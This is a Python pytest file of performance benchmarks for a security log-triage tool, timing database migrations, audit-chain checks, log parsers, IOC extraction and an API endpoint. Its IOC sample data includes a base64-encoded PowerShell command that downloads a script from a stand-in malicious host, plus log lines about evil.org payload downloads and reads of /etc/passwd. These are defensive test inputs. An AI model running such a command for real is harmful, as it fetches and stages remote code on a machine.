"""Performance benchmarks that are meaningful at Phase 0.

Spec 09 section 8 lists throughput targets. Most measure the ingest and detection
pipeline, which is built in later phases, so they cannot be measured yet. Rather
than assert nothing, these benchmarks cover the work that exists now and report
the real numbers:

- applying the migration set to an empty database
- audit chain append and full-chain verification
- event insert throughput, including FTS5 index upkeep through triggers
- tier-1 IOC extraction across representative event messages
- indexed event filter latency and an FTS5 MATCH query
- ``/api/health`` latency through the real ASGI stack

Spec 09 requires results in ``docs/perf-results.md`` with device information;
``scripts/perf_report.py`` writes that after a run. Targets that cannot be
measured yet are listed in ``docs/DECISIONS.md`` with the reason.

Run with::

    make perf
"""

from __future__ import annotations

import base64
import json
import sqlite3
import statistics
import time
from collections.abc import Callable, Iterator
from contextlib import contextmanager
from dataclasses import dataclass
from pathlib import Path
from typing import Any

from fastapi.testclient import TestClient

from app.config import load_settings
from app.db.connection import Database, connect
from app.db.migrations import apply_migrations
from app.db.repositories.audit import AuditRepository
from app.ingest.parsers.base import ParseContext
from app.ingest.parsers.fw_paloalto import FwPaloaltoParser
from app.ingest.parsers.generic_csv import GenericCsvParser
from app.ingest.parsers.linux_auditd import LinuxAuditdParser
from app.ingest.parsers.linux_syslog import LinuxAuthParser
from app.ingest.parsers.web_access import ApacheAccessParser
from app.ingest.parsers.windows_event_xml import EVENT_NAMESPACE as XML_NS
from app.ingest.parsers.windows_event_xml import WindowsEventXmlParser
from app.ingest.parsers.windows_evtx import WindowsEvtxParser, native_backend_available
from app.ioc.allowlist import EMPTY
from app.ioc.extract import extract_fields
from app.main import create_app

BACKEND_ROOT = Path(__file__).resolve().parents[2]
MIGRATIONS_DIR = BACKEND_ROOT / "migrations"
EVTX_FIXTURES = BACKEND_ROOT / "tests" / "fixtures" / "evtx"
LINUX_FIXTURES = BACKEND_ROOT / "tests" / "fixtures" / "linux"

#: pytest's ``record_property`` fixture, which it does not export a type for.
RecordProperty = Callable[[str, object], None]

# Sizes are small enough to keep a run near a minute but large enough that
# per-call overhead does not dominate the result.
AUDIT_ROWS = 2000
EVENT_ROWS = 5000
QUERY_SAMPLES = 200
IOC_RECORDS = 5000

#: A PowerShell base64 payload shared by every IOC benchmark record.
_PS_PAYLOAD = base64.b64encode(
    "curl http://malicious.example.org/a.ps1 -o %TEMP%\\a.ps1".encode("utf-16-le")
).decode()

#: Event-shaped messages that exercise most tier-1 scanners, including one that
#: decodes through the PowerShell pass. The extractor runs every field through
#: refanging, pattern matching and (for long values) the decode passes.
_IOC_TEMPLATES: tuple[str, ...] = (
    "Failed password for invalid user admin from 185.220.101.{octet} port 51{last} ssh2",
    'GET /assets/app.js?cache={n} HTTP/1.1 200 512 "-" "Mozilla/5.0"',
    "new connection 10.0.{hi}.{lo}:443 -> 185.220.101.233:8443 proto tcp",
    "downloaded http://update{n}.evil.org/payload?v=2 from 203.0.113.{lo}",
    "contact joe{n}@{n}.evil.org and see CVE-2024-3094",
    "ran powershell -EncodedCommand {ps}",
)


def _ioc_record(index: int) -> dict[str, str]:
    """One event mapping that the extractor sees, deterministic per index."""
    octet = index % 250
    return {
        "host": f"web-{index % 8}",
        "message": _IOC_TEMPLATES[index % len(_IOC_TEMPLATES)].format(
            n=index,
            octet=octet,
            lo=index % 255,
            hi=index % 16,
            last=f"{index % 100:02d}",
            ps=_PS_PAYLOAD,
        ),
        "src_ip": f"198.51.100.{octet}",
    }


@dataclass(frozen=True)
class Measurement:
    """One benchmark result, in the shape the report writer consumes."""

    name: str
    unit: str
    samples: int
    best: float
    median: float
    worst: float

    def as_dict(self) -> dict[str, Any]:
        return {
            "name": self.name,
            "unit": self.unit,
            "samples": self.samples,
            "best": round(self.best, 6),
            "median": round(self.median, 6),
            "worst": round(self.worst, 6),
        }


@contextmanager
def _migrated(path: Path) -> Iterator[Database]:
    """A migrated database, closed on exit."""
    database = Database(path)
    apply_migrations(database.writer, MIGRATIONS_DIR)
    try:
        yield database
    finally:
        database.close()


def _record(record_property: RecordProperty, measurement: Measurement) -> None:
    """Publish a measurement so the run_perf.py collector can gather it.

    No printing: the numbers end up in docs/perf-results.md, and interleaving
    them with pytest's own output only makes the run harder to read.
    """
    record_property("perf", json.dumps([measurement.as_dict()]))


def _per_query(work: Callable[[], None], samples: int) -> list[float]:
    """Seconds for each of `samples` batches of queries."""
    timings = []
    for _ in range(samples):
        start = time.perf_counter()
        work()
        timings.append(time.perf_counter() - start)
    return timings


def _seed_case_and_source(connection: sqlite3.Connection) -> None:
    """Insert the case and source that events reference."""
    connection.execute(
        "INSERT INTO cases (id, name, created_at, updated_at)"
        " VALUES ('c', 'bench', '2026-01-01T00:00:00Z', '2026-01-01T00:00:00Z')"
    )
    connection.execute(
        "INSERT INTO sources (id, case_id, filename, stored_path, size_bytes, sha256,"
        " log_type, status, ingested_at)"
        " VALUES ('s', 'c', 'bench.log', 'data/sources/bench.log', 1, 'x',"
        " 'text', 'done', '2026-01-01T00:00:00Z')"
    )


def _insert_events(connection: sqlite3.Connection, count: int) -> None:
    """Insert `count` events spread across hosts, users and addresses."""
    connection.executemany(
        "INSERT INTO events (case_id, source_id, record_ref, ts_ms, ts_iso, log_type, host,"
        " user_name, src_ip, message, raw) VALUES ('c','s',?,1700000000000,"
        "'2026-01-01T00:00:00Z','text',?,?,?,?,?)",
        (
            (
                f"ref-{index}",
                f"HOST-{index % 20}",
                f"user-{index % 7}",
                f"10.0.{index % 255}.{index % 99}",
                "failed password for invalid user",
                "raw line",
            )
            for index in range(count)
        ),
    )


def test_measure_apply_migrations(tmp_path: Path, record_property: RecordProperty) -> None:
    """Applying every migration to an empty database."""
    timings = []
    for index in range(5):
        connection = connect(tmp_path / f"migrate-{index}.db")
        try:
            start = time.perf_counter()
            apply_migrations(connection, MIGRATIONS_DIR)
            timings.append(time.perf_counter() - start)
        finally:
            connection.close()

    measurement = Measurement(
        name="migrations.apply",
        unit="s/database",
        samples=len(timings),
        best=min(timings),
        median=statistics.median(timings),
        worst=max(timings),
    )
    _record(record_property, measurement)


def test_measure_audit_append(tmp_path: Path, record_property: RecordProperty) -> None:
    """Appending rows to the audit hash chain."""
    with _migrated(tmp_path / "audit-append.db") as database:
        repository = AuditRepository(database.writer)

        def append_many(count: int) -> None:
            for index in range(count):
                repository.append("settings_changed", detail={"benchmark": True, "i": index})

        rounds = []
        for _ in range(3):
            start = time.perf_counter()
            append_many(AUDIT_ROWS)
            rounds.append((time.perf_counter() - start) / AUDIT_ROWS)

        measurement = Measurement(
            name="audit.append",
            unit="s/row",
            samples=len(rounds),
            best=min(rounds),
            median=statistics.median(rounds),
            worst=max(rounds),
        )
        _record(record_property, measurement)


def test_measure_audit_verify(tmp_path: Path, record_property: RecordProperty) -> None:
    """Verifying a full chain of AUDIT_ROWS rows."""
    with _migrated(tmp_path / "audit-verify.db") as database:
        repository = AuditRepository(database.writer)
        for index in range(AUDIT_ROWS):
            repository.append("settings_changed", detail={"i": index})

        def verify() -> None:
            result = repository.verify()
            assert result.ok, "the chain must verify before it can be timed"

        timings = _per_query(verify, samples=5)
        measurement = Measurement(
            name="audit.verify",
            unit="s/row",
            samples=len(timings),
            best=min(timings) / AUDIT_ROWS,
            median=statistics.median(timings) / AUDIT_ROWS,
            worst=max(timings) / AUDIT_ROWS,
        )
        _record(record_property, measurement)


def test_measure_event_insert(tmp_path: Path, record_property: RecordProperty) -> None:
    """Inserting events in one transaction, which maintains the FTS5 index."""
    with _migrated(tmp_path / "events.db") as database:
        with database.transaction() as writer:
            _seed_case_and_source(writer)

        rounds = []
        for _ in range(3):
            start = time.perf_counter()
            with database.transaction() as writer:
                _insert_events(writer, EVENT_ROWS)
            rounds.append((time.perf_counter() - start) / EVENT_ROWS)

        measurement = Measurement(
            name="events.insert",
            unit="s/event",
            samples=len(rounds),
            best=min(rounds),
            median=statistics.median(rounds),
            worst=max(rounds),
        )
        _record(record_property, measurement)


def test_measure_indexed_filter(tmp_path: Path, record_property: RecordProperty) -> None:
    """An indexed equality filter, the shape the Events API uses."""
    with _migrated(tmp_path / "filter.db") as database:
        with database.transaction() as writer:
            _seed_case_and_source(writer)
            _insert_events(writer, EVENT_ROWS)

        hosts = [f"HOST-{index % 20}" for index in range(QUERY_SAMPLES)]

        def query() -> None:
            for host in hosts:
                writer.execute(
                    "SELECT id FROM events WHERE case_id = 'c' AND host = ?", (host,)
                ).fetchall()

        timings = _per_query(query, samples=3)
        measurement = Measurement(
            name="events.filter_indexed",
            unit="s/query",
            samples=QUERY_SAMPLES * 3,
            best=min(timings) / QUERY_SAMPLES,
            median=statistics.median(timings) / QUERY_SAMPLES,
            worst=max(timings) / QUERY_SAMPLES,
        )
        _record(record_property, measurement)


def test_measure_windows_evtx_parse(record_property: RecordProperty) -> None:
    """Parsing the EVTX fixtures: the native reader when available, else vendored."""
    backend = None if native_backend_available() else "vendored"
    per_record: list[float] = []
    for _ in range(3):
        for name in ("security_logons.evtx", "sysmon_attack.evtx"):
            context = ParseContext(
                case_id="c",
                source_id="s",
                filename=name,
                path=EVTX_FIXTURES / name,
                max_line_bytes=1 << 20,
            )
            parser = WindowsEvtxParser(backend=backend)
            start = time.perf_counter()
            parsed = sum(1 for item in parser.parse(context) if not hasattr(item, "reason"))
            per_record.append((time.perf_counter() - start) / parsed)

    measurement = Measurement(
        name="windows_evtx.parse",
        unit="s/record",
        samples=len(per_record),
        best=min(per_record),
        median=statistics.median(per_record),
        worst=max(per_record),
    )
    _record(record_property, measurement)


def test_measure_windows_event_xml_parse(tmp_path: Path, record_property: RecordProperty) -> None:
    """Parsing a generated Event XML document of 5,000 records."""
    record_count = 5000
    template = (
        '<Event><System><Provider Name="p"/><EventID>4624</EventID>'
        "<Level>0</Level>"
        '<TimeCreated SystemTime="2026-03-01T12:00:00Z"/>'
        "<EventRecordID>{n}</EventRecordID><Channel>Security</Channel>"
        "<Computer>DC01</Computer></System><EventData>"
        '<Data Name="TargetUserName">u{n}</Data>'
        '<Data Name="IpAddress">198.51.100.77</Data></EventData></Event>'
    )
    document = (
        f'<?xml version="1.0"?><Events xmlns="{XML_NS}">'
        + "".join(template.format(n=index) for index in range(record_count))
        + "</Events>"
    )
    path = tmp_path / "bench.xml"
    path.write_text(document, encoding="utf-8")

    per_record: list[float] = []
    for _ in range(3):
        context = ParseContext(
            case_id="c",
            source_id="s",
            filename="bench.xml",
            path=path,
            max_line_bytes=1 << 20,
        )
        start = time.perf_counter()
        parsed = sum(1 for _ in WindowsEventXmlParser().parse(context))
        per_record.append((time.perf_counter() - start) / parsed)

    measurement = Measurement(
        name="windows_event_xml.parse",
        unit="s/record",
        samples=len(per_record),
        best=min(per_record),
        median=statistics.median(per_record),
        worst=max(per_record),
    )
    _record(record_property, measurement)


def test_measure_linux_syslog_parse(tmp_path: Path, record_property: RecordProperty) -> None:
    """Parsing a generated RFC 3164 auth log of 5,000 lines."""
    line_count = 5000
    users = ["admin", "test", "root", "oracle"]
    rows = [
        f"Mar  1 12:{index % 60:02d}:{index % 60:02d} web01 sshd[{1200 + index}]: "
        f"Failed password for {users[index % len(users)]} from 185.220.101.45 "
        f"port {40000 + index} ssh2"
        for index in range(line_count)
    ]
    path = tmp_path / "auth.log"
    path.write_text("\n".join(rows) + "\n", encoding="utf-8", newline="\n")

    per_record: list[float] = []
    for _ in range(3):
        context = ParseContext(
            case_id="c",
            source_id="s",
            filename="auth.log",
            path=path,
            max_line_bytes=1 << 20,
            assumed_year=2025,
            timezone="UTC",
        )
        start = time.perf_counter()
        parsed = sum(1 for _ in LinuxAuthParser().parse(context))
        per_record.append((time.perf_counter() - start) / parsed)

    measurement = Measurement(
        name="linux_syslog.parse",
        unit="s/record",
        samples=len(per_record),
        best=min(per_record),
        median=statistics.median(per_record),
        worst=max(per_record),
    )
    _record(record_property, measurement)


def test_measure_linux_auditd_parse(tmp_path: Path, record_property: RecordProperty) -> None:
    """Parsing generated audit groups of 3 lines each, 2,000 groups."""
    group_count = 2000
    rows: list[str] = []
    for index in range(group_count):
        serial = 10000 + index
        rows.append(
            f"type=SYSCALL msg=audit(1740909601.{index % 1000:03d}:{serial}): "
            "arch=c000003e syscall=59 success=yes exit=0 items=1 ppid=1 "
            f'pid={index} auid=1000 uid=0 gid=0 comm="cat" exe="/usr/bin/cat" key="exec"'
        )
        rows.append(
            f"type=EXECVE msg=audit(1740909601.{index % 1000:03d}:{serial}): "
            'argc=2 a0="cat" a1="2F6574632F706173737764"'
        )
        rows.append(
            f"type=PATH msg=audit(1740909601.{index % 1000:03d}:{serial}): "
            'item=0 name="/etc/passwd" inode=1 dev=fd:00 mode=0100644'
        )
    path = tmp_path / "audit.log"
    path.write_text("\n".join(rows) + "\n", encoding="utf-8", newline="\n")

    per_record: list[float] = []
    for _ in range(3):
        context = ParseContext(
            case_id="c",
            source_id="s",
            filename="audit.log",
            path=path,
            max_line_bytes=1 << 20,
        )
        start = time.perf_counter()
        parsed = sum(1 for _ in LinuxAuditdParser().parse(context))
        per_record.append((time.perf_counter() - start) / parsed)

    measurement = Measurement(
        name="linux_auditd.parse",
        unit="s/record",
        samples=len(per_record),
        best=min(per_record),
        median=statistics.median(per_record),
        worst=max(per_record),
    )
    _record(record_property, measurement)


def test_measure_web_access_parse(tmp_path: Path, record_property: RecordProperty) -> None:
    """Parsing a generated Apache combined access log of 5,000 lines."""
    line_count = 5000
    paths = ["/", "/index.html", "/assets/app.js", "/api/status"]
    rows = [
        f"192.0.2.{index % 250} - - [01/Mar/2026:12:{index % 60:02d}:{index % 60:02d} +0000] "
        f'"GET {paths[index % len(paths)]} HTTP/1.1" 200 512 "-" "Mozilla/5.0"'
        for index in range(line_count)
    ]
    path = tmp_path / "access.log"
    path.write_text("\n".join(rows) + "\n", encoding="utf-8", newline="\n")

    per_record: list[float] = []
    for _ in range(3):
        context = ParseContext(
            case_id="c",
            source_id="s",
            filename="access.log",
            path=path,
            max_line_bytes=1 << 20,
        )
        start = time.perf_counter()
        parsed = sum(1 for _ in ApacheAccessParser().parse(context))
        per_record.append((time.perf_counter() - start) / parsed)

    measurement = Measurement(
        name="web_access.parse",
        unit="s/record",
        samples=len(per_record),
        best=min(per_record),
        median=statistics.median(per_record),
        worst=max(per_record),
    )
    _record(record_property, measurement)


def test_measure_fw_paloalto_parse(tmp_path: Path, record_property: RecordProperty) -> None:
    """Parsing a generated PAN-OS traffic CSV of 5,000 rows."""
    line_count = 5000
    actions = ["deny", "allow", "drop"]
    rows = [
        ",".join(
            [
                "1",
                "2026/03/01 12:00:00",
                "0011",
                "TRAFFIC",
                "end",
                "2026/03/01 12:00:00",
                f"192.0.2.{index % 250}",
                "10.0.0.5",
                "0.0.0.0",
                "0.0.0.0",
                "bench",
                "-",
                "-",
                "web-browsing",
                "vsys1",
                "untrust",
                "trust",
                "ethernet1/1",
                "ethernet1/2",
                "log-forward",
                "0",
                str(70000 + index),
                "1",
                "40001",
                "22",
                "0",
                "0",
                "0x4000",
                "tcp",
                actions[index % len(actions)],
                "-",
            ]
        )
        for index in range(line_count)
    ]
    path = tmp_path / "paloalto_traffic.csv"
    path.write_text("\n".join(rows) + "\n", encoding="utf-8", newline="\n")

    per_record: list[float] = []
    for _ in range(3):
        context = ParseContext(
            case_id="c",
            source_id="s",
            filename="paloalto_traffic.csv",
            path=path,
            max_line_bytes=1 << 20,
            timezone="UTC",
        )
        start = time.perf_counter()
        parsed = sum(1 for _ in FwPaloaltoParser().parse(context))
        per_record.append((time.perf_counter() - start) / parsed)

    measurement = Measurement(
        name="fw_paloalto.parse",
        unit="s/record",
        samples=len(per_record),
        best=min(per_record),
        median=statistics.median(per_record),
        worst=max(per_record),
    )
    _record(record_property, measurement)


def test_measure_generic_csv_parse(tmp_path: Path, record_property: RecordProperty) -> None:
    """Parsing a generated Splunk CSV export of 5,000 rows through a profile.

    This is the generic CSV path end to end: delimiter sniffing, the header, and
    a per-row map through the shipped ``splunk-csv`` profile.
    """
    line_count = 5000
    rows = ["_time,host,source,sourcetype,_raw"]
    rows.extend(
        f"2026-03-01T12:{index % 60:02d}:00Z,web01,src,linux_secure,"
        f"Failed password for admin from 185.220.101.45 port {40000 + index} ssh2"
        for index in range(line_count)
    )
    path = tmp_path / "splunk_export.csv"
    path.write_text("\n".join(rows) + "\n", encoding="utf-8", newline="\n")

    per_record: list[float] = []
    for _ in range(3):
        context = ParseContext(
            case_id="c",
            source_id="s",
            filename="splunk_export.csv",
            path=path,
            max_line_bytes=1 << 20,
            timezone="UTC",
        )
        start = time.perf_counter()
        parsed = sum(1 for _ in GenericCsvParser().parse(context))
        per_record.append((time.perf_counter() - start) / parsed)

    measurement = Measurement(
        name="generic_csv.parse",
        unit="s/record",
        samples=len(per_record),
        best=min(per_record),
        median=statistics.median(per_record),
        worst=max(per_record),
    )
    _record(record_property, measurement)


def test_measure_ioc_extract(record_property: RecordProperty) -> None:
    """Tier-1 IOC extraction over representative event messages.

    ``extract_fields`` includes refanging, every tier-1 scanner, and the decode
    passes for long values. As with the parse benchmarks, the number is a
    baseline for regression detection; the spec 09 pipeline target (parse +
    normalize + IOC + persist) is measured end to end in a later phase.
    """
    records = [_ioc_record(index) for index in range(IOC_RECORDS)]

    def extract() -> int:
        hits = 0
        for record in records:
            hits += len(extract_fields(record, allowlist=EMPTY))
        return hits

    rounds = []
    for _ in range(3):
        start = time.perf_counter()
        count = extract()
        assert count > 0, "the benchmark must actually find indicators"
        rounds.append((time.perf_counter() - start) / IOC_RECORDS)

    measurement = Measurement(
        name="ioc.extract",
        unit="s/record",
        samples=len(rounds),
        best=min(rounds),
        median=statistics.median(rounds),
        worst=max(rounds),
    )
    _record(record_property, measurement)


def test_measure_fts_query(tmp_path: Path, record_property: RecordProperty) -> None:
    """A MATCH query against the FTS5 index."""
    with _migrated(tmp_path / "fts.db") as database:
        with database.transaction() as writer:
            _seed_case_and_source(writer)
            _insert_events(writer, EVENT_ROWS)

        def query() -> None:
            for _ in range(QUERY_SAMPLES):
                writer.execute(
                    "SELECT e.id FROM events_fts f JOIN events e ON e.id = f.rowid"
                    " WHERE events_fts MATCH ? LIMIT 50",
                    ("failed",),
                ).fetchall()

        timings = _per_query(query, samples=3)
        measurement = Measurement(
            name="events.fts_query",
            unit="s/query",
            samples=QUERY_SAMPLES * 3,
            best=min(timings) / QUERY_SAMPLES,
            median=statistics.median(timings) / QUERY_SAMPLES,
            worst=max(timings) / QUERY_SAMPLES,
        )
        _record(record_property, measurement)


def test_measure_health_endpoint(tmp_path: Path, record_property: RecordProperty) -> None:
    """/api/health through the real ASGI stack, middleware included."""
    # A temporary data directory keeps the benchmark off the real database, and
    # base_url names a loopback Host the validation middleware accepts.
    settings = load_settings(
        environ={
            "TRIAGELENS_STORAGE__DATA_DIR": str(tmp_path / "data"),
            "TRIAGELENS_LOGGING__CONSOLE": "false",
        }
    )
    app = create_app(settings)
    with TestClient(app, base_url="http://127.0.0.1:8787") as client:

        def query() -> None:
            for _ in range(QUERY_SAMPLES):
                response = client.get("/api/health")
                assert response.status_code == 200

        timings = _per_query(query, samples=3)

    measurement = Measurement(
        name="api.health",
        unit="s/request",
        samples=QUERY_SAMPLES * 3,
        best=min(timings) / QUERY_SAMPLES,
        median=statistics.median(timings) / QUERY_SAMPLES,
        worst=max(timings) / QUERY_SAMPLES,
    )
    _record(record_property, measurement)
